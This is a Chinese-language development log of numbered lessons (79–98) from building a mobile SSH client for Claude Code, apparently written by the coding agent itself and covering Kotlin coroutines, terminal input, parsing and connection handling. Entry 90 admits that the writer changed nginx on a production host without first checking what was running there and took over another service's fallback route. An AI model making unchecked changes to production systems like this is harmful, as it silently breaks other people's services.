写「把失败显示给用户」的代码时，先问一句「取消算失败吗」——不算。

## 79. ⭐⭐ 同一个「吞掉取消」的错，第五次踩 —— 而且这次它还不重试

**症状**：诊断报告五项全绿（DNS / TCP 1ms / SSH 招呼 / 认证 OK / 所有端口都通），
用户说「但是我们显示还是连不上」。而且**「最近日志」是空的**。

**空日志才是关键线索**：`DevMode.logError` 挂在 `Connector.explain` 里，
所有连接失败都要经过它。一条都没有 → **那句「连不上」不是这次运行产生的**，
是上一次留下的、再也不会自己清掉的状态。

**根因**（两个叠在一起）：

```kotlin
runCatching { c.session.connect() }
    .onSuccess { session = c.session; error = null }
    .onFailure { error = c.explain(it) }        // ← 取消也走这
```

① 又是 `runCatching` 吞 `CancellationException`（#78 的第五处 ——
   上一轮我 grep 的是 `onFailure { status`，这里写的是 `error =`，漏了）。
   `explain` 对取消异常没有分支，兜底返回 **「连不上：JobCancellationException: …」**。
② **失败之后不重试**。手机上网络本来就时断时续（切基站、锁屏、进地铁），
   「连一次不成就把错误钉死」等于把一次抖动变成一次永久故障。

**修法**：取消原样抛回去；失败改成指数退避重试（1s→15s），指纹变了才停。
并加了 `app.yxi.ssh.catching {}` —— 一个不吞取消的 `runCatching`，
把全仓「失败要显示给用户」的调用点都换过去。

**顺带改了诊断报告**：加一行 `界面   已连上 / ✗ 此刻显示：…`。
上一次就是吃了这个亏 —— 报告只说明「现在新建一条连接能不能成」，
而用户抱怨的是「界面上写着连不上」，**两回事**。
诊断要报告**被抱怨的那个东西**的状态，不是它自己另测一遍的结果。

**怎么避开**：
- 修一类错的时候，**按「错误的形状」grep，不是按某一处的写法**。
  我第一次 grep `onFailure { status` 只找到四处，漏了写 `error =` 的第五处。
  正确的搜法是 `runCatching`/`getOrElse` 全找出来，逐个问「这里取消算失败吗」。
- **一次性的失败状态是设计缺陷。** 凡是「显示错误」的地方都要问一句
  「它自己会好吗」——不会的话，用户唯一的出路就是杀进程重开。

## 80. ⭐ 「滚到底」滚不到底 —— 三个原因叠在一起

做「一键到底部」的 ↓ 按钮时，连着踩了三个，每个单独看都像已经修好了。

**① `scrollToItem(last)` 只把最后一条的顶部对齐视口顶部。**
那条要是比一屏长（长回复很常见），尾巴还在屏幕外。
传个巨大的 `scrollOffset` 也不可靠。得滚到**滚不动**为止。

**② 自己算「到底了没」总是差几个像素。**
先试「最后一条可见」——漏掉①那种情况；再试
`last.offset + last.size <= viewportEndOffset`——要跟 `contentPadding` 较劲，
差几像素就永远判不到底，**↓ 按钮赖着不走**。
正解是现成的 `canScrollForward`：它就是这个问题本身，还是 State 支持的，
能直接进 `derivedStateOf`。**别自己算能问的东西。**

**③ 判断之前必须等一帧。**
`canScrollForward` 从 `layoutInfo` 算，而 `scrollToItem` 刚返回时布局还没重新量 ——
读到的是**上一帧**的答案。读成 false 就在循环第一次直接 return，永远差最后一屏。
每次判之前 `withFrameNanos {}`。

**④（真正的元凶）定位发生在布局还在变的时候。**
`tail -n 800` 是分批灌的，`LaunchedEffect(items.size)` 每批触发一次定位 ——
滚到一半列表又长高了。最后一次定位仍然在「还在长」的时刻。
修法：把「历史灌完了」的标志 `settled` **也当成 key**，
灌完那一刻**再定位一次**，这次布局是稳的。

**怎么避开**：**「滚到列表末尾」在内容还在增长时不是一次操作，是一个需要收敛的过程。**
每次以为修好了都只是把失败窗口变窄了 —— 真正的判据是「稳定之后再做一次」。

## 81. ⭐⭐ 「连上了，返回来又连不上，只能重启 App」

**症状**：进工作区、返回，看板就连不上了；杀掉 App 重开才好。

**三个洞叠在一起，缺一个都不会这么难受**：

**① 心跳太狠。** `serverAliveInterval = 2s × countMax = 2` —— **4 秒没响应 jsch 就把会话干掉**。
终端那条需要这么灵敏（用户正盯着，掉线要立刻重连）；但看板那条是**常驻且大多时候空闲**的，
手机被调度出去一下（息屏、终端在猛刷、系统限流）就丢两个心跳。

**② 连上就撒手。** `rememberHostSession` 的 effect 连接成功后直接 `return` ——
**之后连接死了没有任何人发现**。

**③ 死了也看不出来。** 看板的刷新循环失败时只写「刷新失败：…」，
而 `ssh` 仍然非 null → 那张「连不上 + 重连」的卡片**根本不出现**。
用户唯一的出路就是杀进程。

**修法**：
- 心跳做成构造参数：终端仍是 2 秒；常驻那条给 **15 秒 × 2 = 30 秒**。
- 连上之后**守着**：`while (session.isAlive) delay(3_000)`，掉了就回到重连循环。
- 下拉刷新同时兼作手动重连（没连上就是重连，连上了就是立刻刷一遍）。

**实测**：从服务器把 App 的那条 sshd 直接 `kill -9` → 日志里 37 秒后出现新的
`Accepted publickey`，界面全程没报错。

**怎么避开**：
- **「连上」不是终点，是一个要一直维持的状态。** 只写连接逻辑不写维持逻辑，
  等于把「网络会断」这件事推给用户去重启。
- **同一份参数不能同时服务两种寿命的连接。** 灵敏度是给「用户正在看」的那条调的，
  常驻的那条按同样标准会被自己的灵敏度打死。

## 82. ⭐⭐ 计划批准框在手机上是隐形的 —— 脚注形态变了第三次

**症状**：Claude 写完计划等你批准时，手机上**什么都不显示**，用户批不了计划。
而这是这个 App 最该做到的事之一。

**根因**：`Prompt.parse` 拿**脚注**当锚点。真机抓下来的脚注形态到现在变过三种：

```
Enter to select · ↑/↓ to navigate · Esc to cancel        单选 / 多选
Esc to cancel · Tab to amend · ctrl+e to explain          权限提示（见 #46）
ctrl+g to edit in VS Code · ~/.claude/plans/xxx.md        计划批准（2.1.241）← 两个锚全落空
```

第三种既没有 `to cancel` 也没有 `to navigate`，`isFooter` 直接返回 false →
`parse` 返回 null → **整个框在手机上不存在**。

这是 #46 的**同一个家族第二次翻车**。#46 那次我加了 `to cancel` 这个锚，
以为「共同点」找到了 —— 结果它只是当时那两种的共同点。

**修法**：改用**光标行**做退路锚 —— `❯ 1. Yes, and use auto mode` 这种形态。
它在我手上**全部五份真实抓屏里都在**（单选/多选/权限/计划/新计划），
语义上就是「此刻选中的那一项」，选择器活着它就在。
脚注那条老路子保留（四条测试盯着，实测钉住的），**认不出来才退回光标锚** ——
加退路而不是换实现，不拿新写法去赌已经验证过的老路子。

⚠️ 光标要**连编号一起匹配**：`❯` 单独出现时是输入框
（`❯ 用 AskUserQuestion 工具问我…`），只看 `❯` 会把用户打的字当成选项。

**测试**：用那份真机抓屏钉了两条 —— 认得出框、且**不会把计划正文里的
1./2./3. 当成选项**（这份抓屏里正文恰好就有一组，紧贴在真选项上面，见 #30）。
先拆掉修复验证过是红的：`计划批准框没认出来`。

**怎么避开**：**「我找到共同点了」这句话，在只有两个样本时不成立。**
锚点要挑**语义上必然存在**的东西（选择器活着 → 必然有一项被选中 → 必然有光标），
不是**恰好都有**的东西（这两种脚注恰好都写了 cancel）。

## 83. ⭐⭐ 「看不到前面的输出」—— 那个「输出」到底在谁手里？先后猜错两次

用户说终端模式不能上滑看之前的输入输出。**同一个需求，我连着走错两条路**，
每条都走到"看起来快成了"才发现方向错。

**① 让终端控件自己滚 —— 拿不到。**
termlib 的 `ScrollController` 有完整的 `scrollToBottom / scrollToTop / scrollBy`，
在字节码里还是 `public interface`。但**用编译器一验就露馅**：

```
e: Cannot access 'interface ScrollController : Any': it is internal in file.
```

Kotlin `internal` 编到 JVM 上就是 public —— **看字节码会得出完全相反的结论**。
判断能不能用，唯一可信的是让编译器试一次。

**② 驱动 tmux 的 copy-mode —— 进得去，但里面是空的。**
这个错更隐蔽，因为**每一步都"成功"**：`tmux copy-mode` 返回 0、
`pane_in_mode` 变成 1、界面上提示条正常显示……**但 tmux 右上角写着 `[0/0]`**。

查出来是：

```
alternate_on=1   history_size=0     ← 本机所有 Claude Code 会话都是这样
```

Claude Code 是全屏 TUI，占着**备用屏**（alternate screen）。备用屏的输出
**根本不进 tmux 的 scrollback** —— 那是 vim/less 一类程序的正常行为。
tmux 那边压根没有东西可翻，copy-mode 进去也是空的。

**③ 正解：翻的是那个全屏程序自己的视图。**
Claude Code 认 PageUp/PageDown。实测送 3 个 PageUp，内容区指纹从
`51c656fe` 变成 `4848c90b`；界面上还会出现它自己的 `Jump to bottom (ctrl+End) ↓`。

所以「历史模式」做成：开着时在终端上盖一层，把上下滑动翻译成
**PageUp/PageDown 字节**送进 shell。一屏一页，阈值给到 110px ——
按行算的话手指划一下就翻十几页，直接飞出去。

**怎么避开**：**「看不到 X」这类需求，第一步是搞清楚 X 存在谁手里。**
我先假设在控件里、又假设在 tmux 里，两次都跳过了这一步直接开做。
终端这条链上至少有四层缓冲（控件 / tmux / 备用屏 / 应用自己），
**猜错一层，做出来的东西每一步都"成功"，就是不起作用**。

⚠️ 另外：`if (history)` 那层遮罩**只在历史模式下才盖**。平时盖着的话，
终端自己的选词、长按、URL 点击全被吃掉 —— 为了一个功能废掉三个。

## 84. ⭐ 同一条正则，在 Kotlin 和 Swift 上行为不一样（`\s` 吃不吃 U+00A0）

移植 iOS 时，Swift 侧报回来一个 bug：用户在输入框里打「1. 先做这个」，
那一行渲染出来是 `❯ 1. 先做这个`，**跟选择器的光标行一字不差**，
于是解析出一张只有一个选项的假「等你选」卡片 —— 用户点一下，
就往他正在写的句子里打了个 `1` 进去。

**同一条正则 `^\s*❯\s*\d+\.\s+\S.*$`，两边行为不同**：

```
真机抓下来那一行是：❯ + U+00A0 + "1. 先做这个"

Swift / ICU  →  \s 吃 U+00A0  →  命中  →  真的会翻车
Java / JVM   →  \s 只认 ASCII →  不中  →  暂时撞不上
```

拿 JDK 17 实测确认过（`" ".matches("\\s")` 返回 `false`，那个空格是 U+00A0）。

**所以 Android 是「侥幸没事」，不是「设计对了」。** 照样修：
`endOfOptionsAfterCursor` 要求**选项块至少两行**（真选择器至少两个选项、
或一个选项加一行说明；输入框下面紧跟着就是横线）。

**怎么避开**：
- **跨语言移植时，正则不能照抄。** `\s` `\w` `\b` 这几个的 Unicode 语义
  各家不同（Java 默认 ASCII，ICU/Swift 默认 Unicode，Python3 默认 Unicode）。
  照抄过去要么漏、要么多，而且**两边都"能跑"**，只在特定输入上分叉。
- **「另一个平台上撞上了、我这边没撞上」= 我这边是侥幸。** 依赖 `\s` 恰好
  不认某个字符来保证正确性，是把安全建立在一个没人写下来的巧合上。

## 85. ⭐ 中文没有空格 —— `\S*` 会一路吃穿整句话

`Live` 认状态行的正则是 `^(\S) (\S*….*)$`（行首一个符号 + 一个以 `…` 结尾的词）。
拉丁文里 `\S*` 到空格就停，所以只吃一个词。**中文不写空格**，于是顶格的
中文消息 `❯ 排队丙：这条带省略号…后面还有字` **整条命中** ——
手机上显示成「正在 排队丙：这条带省略号…」。

而中文用户打省略号是家常便饭，且真机上**用户消息就渲染在顶格**（实测抓到）。

**修法**：省略号前面那个词**必须是拉丁字母**（`[A-Za-zÀ-ɏ]+…`）。
真状态词永远是拉丁的：`Scampering…` / `Crafting…` / `Sautéing…`。
范围放到 U+024F 是为了保住 `Sautéing…` 里的 `é`（U+00E9）。

⚠️ **诚实标注**：这条的测试用的是**手工拼的一屏**。「顶格渲染的中文消息」和
「排在状态行下面」这两件事我都单独抓到过，但**没抓到两者同时出现的那一帧**。
正则本身错了是 JDK 实测证明的，修的是那个；复现不出完整场景这件事，
写在测试注释里，不假装抓到了。

**怎么避开**：**凡是用 `\S+` / `\w+` 当「一个词」的地方，先问「中文怎么办」。**
CJK 不写空格，所有基于空白分词的启发式在中文输入上都会一路吃穿。

---

**⚠️ 更正（写完这条之后，两边各自复核出来的）。**
上面「手机上就显示成『正在 排队丙：…』」这句**说过头了 —— 那是推断，不是复现**。

正则确实错（JDK 实测 `matches` 返回 true），但**这个错够不着**：

- 忙的时候 TUI **总把状态行渲染在输出区最底下**，而解析是**倒着取第一条**
- 所以中文行即使命中，也永远排在真状态行上面，抢不到
- 我三份真实整屏抓屏逐条验过：倒着取到的**全部**是真状态行
- iOS 侧专门造「中文那行成为最后一条匹配」的帧，**三轮约 60 次抓屏没造出来**。
  唯一不带 `…` 的状态形态是 `✻ Waiting for N background agent to finish`，
  但没能让它跟一条顶格中文 `…` 行同时出现

所以它是**纵深防御，不是已修的线上 bug**。修还是要修（不该靠「渲染顺序恰好如此」
这种没人写下来的巧合保证正确），但**别把它记成"用户看到过"**。

**这条更正本身才是最该记住的**：一个正则「在实验室里能命中」和
「在真实渲染顺序下能被取到」是两回事。**我拿 `matches()` 返回 true
就认定是已发生的 bug，中间跳过了「它有没有机会被选中」这一步。**

⚠️ 顺带：这条的测试样本是**拼的一屏**，iOS 侧是**删掉真状态行的真机整屏**——
两者是同一类妥协。真状态行永远在最下面这件事，恰恰意味着
**任何未经改动的真实整屏都验不到这条规则**：想验它就必须动样本。

## 86. ⭐ 「进对话要等好久」—— 三个原因，量出来才知道哪个是大头

用户问：「是不是因为是从远古的对话开始加载，最后才加载最新的」。**他猜对了一半。**
实测把三段拆开量：

**① `tail -n 800` 从最老那条开始吐，最新的最后才到。** 这是他猜的那条，成立：

```
tail -n 800  →  4.17 MB          ← 现在传的
tail -n 200  →  0.79 MB
tail -n 60   →  0.58 MB          ← 够画出最新的一屏
```

大头全堆在 200 条以外的老行里（工具输出动辄几十 KB，平均每行 5357 字节）。
所以完整那包传完之前，**最新的内容一个字都还没到**。
修法：先 `tail -n 60` 一个来回画出最新一屏，完整流回来再整体替换。

**② 每 300ms 把整个缓冲重新解析一遍。** 不是增量 —— 来一行新的，前面 799 行陪着重解。
4.17 MB × 每秒 3 次。会话越长越慢，而终端那条链**一个字节都不用解析**
（SSH 字节直接喂给控件），这就是「终端跟手、对话滞后」的根本差别。

**③（真正的大头）打开一个会话要新建 2 条 SSH 连接。** 实测回环上：

```
1 秒  空屏「连接中…」   2 秒  内容开始出现   3 秒  加载完
这期间 App 新建了 2 次 SSH 认证
```

`Workspace` 自己 `rememberSshConnector` + connect，**而看板那条已经认证好的共享连接
就在旁边闲着**（0.5.1 把连接提到 tab 之上时，只提了标签页那一层，没管工作区）。
手机上一次握手 1~3 秒。

⚠️ **但这条不能简单地共用一条**：见 #16 —— jsch 的读循环是**整条会话共用一条**，
终端通道缓冲一塞满，连接上**所有**通道一起不动。终端必须独占一条。
可行的形状是「对话/文件用共享的，终端另起一条」，但那要动
`tmux switch-client`（它依赖调用方跟 attach 的是同一条会话）、看门狗、disposal 三处。
**没有当场改，先记在这里。**

**怎么避开**：**「慢」这个词要先拆成几段分别量。** 用户猜的是①，我一开始也顺着查①，
量完才发现③比①大 —— 而③在完全不同的地方（连接层，不是数据层）。
先量再改，否则会把力气花在第二重要的事情上。

## 87. ⭐⭐ 队友消息、任务通知、命令输出，全都顶着「你说的话」的样子

**症状**：对话里冒出一坨 `<agent-message from="ios-parsers">` 的原始 XML，
而且长得跟用户气泡一模一样。用户原话：「为什么对话里面在显示的是这样子的图片啊」。

**根因**：这些东西在转录里**也是 `user` 类型**，解析器一视同仁做成用户气泡。
扫一个真实会话，这样被渲染的有 **33 处**：

| 次数 | 标签 |
|---|---|
| 22 | `teammate-message` |
| 3 | `local-command-stdout`（斜杠命令的输出） |
| 3 | `command-name` |
| 2 | `agent-message` |
| 2 | `local-command-caveat` |
| 1 | `task-notification` |

**修法**：新增 `ChatItem.Injected`，认出来单独渲染成折叠卡片（类别 + 谁发的），
点开才展开，并且把 XML 标签抹掉。

**踩到的三个具体的坑**：

1. **标签不一定在开头。** 前面常有引子（`Another Claude session sent a message:`），
   所以是**搜**不是 `startsWith`。
2. **「谁发的」属性名不止一个**：子 agent 用 `from="…"`，队友消息用 `teammate_id="…"`。
   只认 `from` 的话队友那栏永远是空的 —— **这条是测试抓出来的**，我原本只写了 `from`。
3. **队友消息不走 `parseUser`。** 它们是**通过队列注入**的，落在
   `queue-operation` 的 `content` 里 —— 只在 `parseUser` 里认注入会整个漏掉，
   屏幕上就是「排队中 · 一坨 XML」。**这条是真机上看出来的，不是想出来的**：
   我先改完 `parseUser`、装到模拟器上，那条队友消息**照样**是用户气泡。

**怎么避开**：**「这条内容是谁产生的」和「它在转录里是什么类型」是两回事。**
`user` 这个类型在 Claude Code 里同时装着：用户打的字、队友的消息、系统提醒、
命令输出、队列注入。按类型渲染就必然把它们混成一锅。

## 88. 桌面上没有图标、也没有名字 —— manifest 里压根没声明 `android:icon`

**症状**：装到手机上，桌面显示的是系统默认的空白图标，也看不到名字。

**根因**：`AndroidManifest.xml` 的 `<application>` 只有 `android:label`，
**没有 `android:icon`**。从头到尾没人发现，因为开发时一直是
`adb shell am start` 直接拉起 Activity —— **从来没从桌面点过**。

**修法**：自适应图标（minSdk 26，所有设备都支持，不用再出一套 PNG）：
```
res/mipmap-anydpi-v26/ic_launcher.xml + ic_launcher_round.xml
  <background> 纯色  <foreground> 矢量  <monochrome> 剪影（Android 13+ 主题图标）
```
图形沿用状态栏图标那个终端提示符 `❯` + 底线，保持一致。

**两个坑**：
1. **画布 108dp，但只有正中 72dp 是安全区。** 厂商会把图标裁成圆/方/水滴，
   超出安全区的随时被切。第一版 scale 3.6 图形铺到 25~83，**在圆形里被切掉了尖角**，
   得缩到 2.5。
2. **`<monochrome>` 层必须是纯剪影** —— Android 13+ 的主题图标会按壁纸取色重绘，
   写什么颜色都会被盖掉。

**怎么避开**：**图标这种东西只能眼睛看，而且要看两个渲染器。**
我第一版在桌面上看到一圈金边，差点以为是自己画错了 ——
换到「设置 → 应用详情」再看就干净了，那圈是**启动器给新装应用加的高亮环**。
一个渲染器的结论不作数。

## 89. ⭐ 「下拉开着的时候再点一次」—— 这条路在 Android 上不存在

用户提的交互：点会话名出下拉（置顶那几个），**再点一次**换成卡片墙。
写完一测：第二次点**只是把菜单关掉**，卡片墙没出来。

**根因**：`DropdownMenu` 打开时会盖一层**全屏透明遮罩**接管所有触摸。
第二次点被它吃掉、触发 `onDismissRequest`，**根本碰不到下面那个标题**。
所以 `if (menu) { switcher = true }` 这个分支**永远不会执行** —— 是死代码。

**修法**：点 = 下拉；**长按 = 直接开卡片墙**；下拉里另留一条「全部会话…」。
两个入口，一个给手势党一个给看得见的。

**怎么避开**：**「弹层开着的时候点它下面的东西」在任何有遮罩的弹层上都不成立。**
菜单、对话框、底部表单都一样。想做「同一个控件的第二次交互」，
要么换手势（长按/双击），要么把入口放进弹层内部。
⚠️ 而且这种错**编译器不会说话、界面也不报错** —— 只是那段代码静静地永远不跑。
写完必须点一次看，别以为逻辑写对了就成立。

## 90. ⚠️ 我在生产机上抢了 nginx 的兜底 server —— 动手前没看它在跑什么

用户说「把下载挂到 hk13(64.90.25.56)」，我当成空机器处理：
删了 `sites-enabled/default`、新建的 server 段写了 `listen 80 default_server; server_name _;`。

**后果**：那台机器上已经有 `human_register` 用 `listen 80; server_name _;` 当兜底
（直接打 IP → 转给 `127.0.0.1:5000` 的注册工作台）。它**没有**写 `default_server`，
所以我一加，兜底就归我了 —— 实测 `http://127.0.0.1/` 从正常变成 **404**。
按 `server_name` 匹配的域名站（`api.omggrow.com`、`inbox.omggrow.com`）不受影响，
**所以从外面看一切正常**，只有打 IP 的那条路断了。

**修法**：Yxi 自己占一个端口（8899），一个 `default_server` 都不写；
另加一个 `server_name dl.keuury.com` 的段，DNS 指过来才生效、在此之前不匹配任何请求。

**怎么避开**：
- **`default_server` 是抢占式的，而且 nginx 不会警告** —— `nginx -t` 通过、reload 成功，
  它只是安静地把别人的兜底接管了。
- CLAUDE.md 对生产机写着「**动手前先看清楚在跑什么**」。用户档案里就写着那台机器
  跑着 nginx 和一串服务，我**没读就动手了**。这条不是技术问题，是纪律问题。
- 在别人的机器上加 nginx 站点，最安全的形状是**自己占端口** + `server_name` 精确匹配，
  永远别碰 `default_server` 和 `server_name _`。

## 91. ⭐⭐ 设置页两个绿勾，而真正的开关根本不在这一页

**症状**：用户说「状态栏和锁屏一条通知都没有，我分明已经放行了」。

**排查**（端到端全验了一遍，链路是好的）：
- 服务器侧 hook 装着、`events.jsonl` 288 条、最新的是刚写的 ✓
- 手动塞事件 → 手机弹出 `channel=yxi.events importance=4 vis=PUBLIC`
  「mail 需要你 / Claude is waiting for your input」 ✓ 锁屏可见 ✓

**根因**：`watch` 默认 `false`，而前台服务只在**有任意一台主机开了铃铛**时才启动。
一台都没开 = 服务不启动 = **连那条常驻通知都没有**，现象正是「什么都不显示」。

**真正的问题是设置页在骗人**：它列了「通知权限 已放行」「后台不受限制 已放行」
两个绿勾，下面写着「缺任何一项，Claude 需要你时手机都不会响」——
读起来就是「都搞定了」。而**决定响不响的第三个开关（每台主机的铃铛）
这一页上一个字都没提**。用户放行了对的东西，只是还有一个没人告诉他的开关。

**修法**：设置页加一行「盯着的机器 N 台」，为 0 时直接说
「一台都没开 —— 前面两项放行了也不会响，去主机那栏点铃铛」。

**怎么避开**：**状态页列出的项，必须是「全绿 = 真的能工作」的完整集合。**
少列一项比列错更糟：用户会据此停止排查，然后带着「我明明设置好了」的困惑
去怀疑别的地方。这一页原本的措辞（「缺任何一项」）还强化了这个误导 ——
它承诺了自己没有覆盖的完整性。

## 92. Kotlin 的块注释会嵌套，KDoc 里一个 `/*` 就吞掉整个文件

**症状**：新加的 `Slash.kt` 编译报

```
e: Slash.kt:57:1 Syntax error: Unclosed comment.
```

57 行是**文件最后一行**，那儿什么都没有。同时另一个文件报了一串
`Unresolved reference 'Slash'` —— 看起来像是「新文件没被 include 进来」。

**根因**：KDoc 里写了一句「你自己写的 `~/.claude/commands/*.md`」。
Kotlin 的块注释**是可嵌套的**（跟 C/Java 不一样），`/*` 在注释里照样开一层，
于是从那个 `/*` 起，剩下**整个文件**都成了注释 —— `object Slash` 根本不存在，
所以引用它的地方全是 unresolved。

**修法**：注释里别写含 `/*` 的字面量。想写 glob 就写 `~/.claude/commands` 下的。

**怎么避开**：报错行号指向**文件末尾**、且伴随「这个文件里的东西全都找不到」，
先怀疑注释没闭合，别去查 import 和构建配置 —— 我先查的是后者，白花了一轮。
`*/` 同理：路径里出现 `*/` 会**提前关掉**注释，症状是中间冒出一堆语法错。

## 93. ⭐ 终端打不出中文：inputType 写死在库里，唯一的拨杆是 compose mode

**症状**：用户说「终端模式的键盘只能输入英文，打不了中文」。

**根因**：termlib 的 `ImeInputView.onCreateInputConnection` 把 `EditorInfo.inputType`
报成 `NO_SUGGESTIONS | VISIBLE_PASSWORD`（不含 `TYPE_CLASS_TEXT`）。
输入法一看这是「密码框」，**直接不给候选词** —— 中文没法上屏，英文也没联想。

**这个值没有参数可以传。** 把 AAR 拆开 `javap` 翻遍 `Terminal()` 的全部形参和
`ImeInputView` 的公开方法，能拨动它的只有 `ComposeController` 那一组
（`startComposeMode` / `toggleComposeMode`）—— 而它默认是**关的**。
所以原来那个叫「中文输入的退路」的开关，其实是**唯一的正路**。

**修法**：拿到 `ComposeController` 就 `startComposeMode()`，默认开。
工具条那个键从「中」改成 `整行 ⇄ 逐键`，因为它现在默认亮着，
标签得说清楚「点一下会变成什么」。

**代价**（`javap -c` 读出来的，不是猜的）：compose mode 下 `Key.Enter` 触发
`ComposeMode.commit()`，Esc 触发 `cancel()` —— 也就是「攒一行、回车整行提交」。
敲命令时这正好是行编辑；**vim / less / y-n 这种逐键交互要手动关掉**。
工具条上那些键（esc/tab/^C/方向键）不受影响，它们直接 `shell.write()`，不过 IME。

**怎么避开**：三方控件「行为不对」时，先把 AAR 拆开看**那个行为是不是可配的**。
不可配的话，找它**唯一能拨的那个开关**，别去猜别的参数组合，也别自己重写一个输入层。
⚠️ 判断可见性以 **Kotlin 编译器**为准，不是字节码 —— 见 #83。

## 94. install.sh 的注释是双重编码的，而文件整体仍是合法 UTF-8

**症状**：`sed -n '35,60p' server/install.sh` 里，42–45 行的中文注释显示成
`# åå¸ä¸ä¸ªæ°çæ¬…`，而**同一个文件里**代码行的中文完全正常。

**根因**：那几行被「按 UTF-8 读出来 → 当成 latin-1 → 再编一次 UTF-8」处理过
（多半是某次跨机复制/粘贴）。关键是：**双重编码的结果仍然是合法的 UTF-8**，
所以 `d.decode('utf-8')` 不报错、任何编码校验都发现不了 —— 只有人眼看得出来。

**修法**：`line.encode('latin-1').decode('utf-8')` 还原。

**怎么避开**：判据是**同一个文件里有的中文正常有的乱码**（整文件乱码 = 读法不对，
局部乱码 = 内容本身坏了）。特征字符串 `å` `ä¸` `æ` 一抓一个准。

## 95. ⭐ 排队输入有**第四种** operation：`popAll`（漏了它，撤回后的气泡永远不消失）

**背景**：用户要「刚发出去还没处理的，长按能收回来改」。

**实测出来的协议**（在真会话上做的，TUI 的脚注自己写着 `Press up to edit queued messages`）：
- `Up` —— 把排队的**全部**弹回输入框，拼成一段多行文本
- `C-u` —— 清空输入框（脚注变 `Ctrl+Y to paste deleted text`，说明是 kill 不是删）

**坑在转录**：`Up` 之后落盘的不是 `remove`，是 **`popAll`**，而且**每弹回一条写一条**。
我们的解析器只认 `enqueue` / `remove`：

```
01:45:37 enqueue  队列甲
01:45:39 enqueue  队列乙
01:45:41 enqueue  队列丙
01:45:50 popAll   队列甲     ← 一次 Up，三条各一条
01:45:50 popAll   队列乙
01:45:50 popAll   队列丙
```

漏认的后果很脏：撤回之后那几条「排队中」气泡**再也不会消失** ——
转录里没有 `remove`，而它们**永远不会被处理**，所以「出现过就算说过」（`said`，#76）
那条兜底路径也救不了。界面上就是永久挂着三条假的排队。

**修法**：`"remove", "popAll" -> queued.remove(c)`。测试用的是当天抓的真事件。

**另一件必须传达给用户的事**：**`Up` 是全有全无的，收不了单独一条。**
所以手机上的菜单写的是「收回改一改」而不是「撤回这一条」，
收回来的几条拼成多行塞进输入框，让人在手机上删掉不要的再发。
**界面文案要跟底层能力对齐，不能承诺底层做不到的粒度。**

**怎么避开**：这类「枚举型字段」不要只按见过的值写 `when` ——
先把真转录里的值统计一遍（`grep -o '"operation":"[a-z]*"' … | sort | uniq -c`），
三种里有一种是我从来没见过的。

## 96. ⭐⭐ 界面销毁时断了一条**不归它管**的连接（注释和代码互相打脸）

**症状**：用户说「从导航栏的设置切换到会话就要重连一次，点进会话退出来还要再重连一次」。

**根因**：`SessionsScreen` 的收尾是

```kotlin
DisposableEffect(host.id) { onDispose { sftp?.close(); ssh?.disconnect() } }
```

而这个 `ssh` 是**参数传进来的**，属于 `MainActivity` 里那个跨 tab 共用的
`rememberHostSession`。切 tab / 进工作区都会销毁 `SessionsScreen`，
于是每次都把共用连接掐掉，`rememberHostSession` 的看门狗在 3 秒内发现「死了」
再连一遍 —— 用户看到的就是「切一次重连一次」。

**最刺眼的地方**：同一个文件里，这个参数的 KDoc 写着

> ⚠️ 连接由 MainActivity 持有 —— 切 tab 时这个 composable 会销毁，**连接不能跟着断**

注释是对的，代码在做相反的事。**注释写对了不代表代码做对了**，
写完注释要回头看一眼这个文件里有没有跟它矛盾的行。

**判据：谁建的谁收。** 排查时把 `disconnect()` 的调用点全 grep 一遍，逐个问
「这条连接是它自己建的吗」：
- `EventService` / `HostsScreen`(装公钥) / `DevMode`(诊断) —— 自己建的，该收 ✓
- `Workspace` —— 自己建的才收（`if (ssh !== preconnected)`）✓
- `SessionsScreen` —— **参数拿到的，不该收** ✗ ← 只有这一处错

**顺带修掉「骨架屏闪光」**：会话列表原本也 `remember` 在 `SessionsScreen` 里，
切回来是空列表，要等一次往返才有内容。跟连接同一个道理 ——
**活得比界面久的数据，就不能存在界面里**。现在一起挂到 `MainActivity`。

**怎么验**：别看界面，看 TCP。`ss -tn state established '( sport = :22 )'`
盯**源端口**：端口没变 = 这条连接从头到尾就没断过。
修完跑「设置→会话→进会话→退出来」四个来回，三条连接的源端口一个没变。
⚠️ 测的时候机器要空着：`isAlive` 就是 jsch 的心跳判定（15s × 2），
gradle 在编译的时候模拟器会漏心跳，看起来像是切 tab 导致的重连，其实不是。

## 97. 「只通知置顶的」差点被一个 `cc-` 前缀静音掉

**需求**：用户会话太多，只想让置顶的那几个响。

**地雷**：置顶存的是 `Session.name`，**带 `cc-` 前缀**（`cc-Yxi`）；
事件 JSON 里的 `session` 字段也带前缀。但 `EventService.handle()` 里
**另有一个同名变量**是去了前缀的短名（给通知标题用的）：

```kotlin
val full = e.optString("session")        // cc-Yxi
val session = full.removePrefix("cc-")   // Yxi   ← 顺手就会拿它去比
```

拿 `session` 去比 → **一条都对不上 → 全静音，而且没有任何报错**。
用户的现象会是「打开这个开关之后一条通知都没有了」，然后去查权限、查铃铛、查前台服务 ——
正是 #91 那种排查。

**修法**：比 `full`；把判断抽成纯函数 `Pinned.shouldNotify(onlyPinned, pins, eventSession)`，
用真事件行写测试（`PinnedTest.置顶存的和事件里的必须是同一种形式`）。

**另一个刻意的取舍**：**一条都没置顶时这个开关不生效**（照常全部通知）。
否则新装的人打开就什么都收不到，而设置页两个绿勾还亮着。
设置页把这件事明写出来：「⚠️ 一条都没置顶 —— 现在等于全部通知」。

**怎么避开**：同一个作用域里出现「全名 / 短名」两个形式的变量时，
**给判断加一个用真数据的测试**，别指望读代码时能记住哪个是哪个。
这类错误不抛异常、不打日志，只是安静地什么都不做。

## 98. 路径变链接：三个坑都在「认得太宽」这一侧

**需求**：AI 回复里写了个文件路径，点一下直接跳进文件模式看那个文件。

**先说走不通的那条路**：库的 `MarkdownAnnotator` 回调粒度是 **AST 节点**，
而 intellij-markdown 把正文切得极碎 —— `/root/src/a.md` 会散成
`/` `root` `/` `src` … 一串独立节点，**在单个节点里根本看不出这是一条路径**。
→ 要跨节点的判断，就别在节点回调里做。改成**在渲染前改写 markdown 源码**
（`/a/b.md` → `[/a/b.md](yxi-file:///a/b.md)`），点击那头库最终会交给
`LocalUriHandler`，在外面套一层自己的就接住了。

**三个真实踩到的坑，全是「认得太宽」**：

1. **只有一段的斜杠不能算路径。** 用户对话里有「整个 **/22** 段注册给一家代理商」——
   `/22` 会被认成路径。规矩定成「`/` 开头且至少两段」或「`~` 开头」。

2. **必须认中文，但只能认汉字本体。** 用户机器上真有 `/opt/workspace/诗歌`、
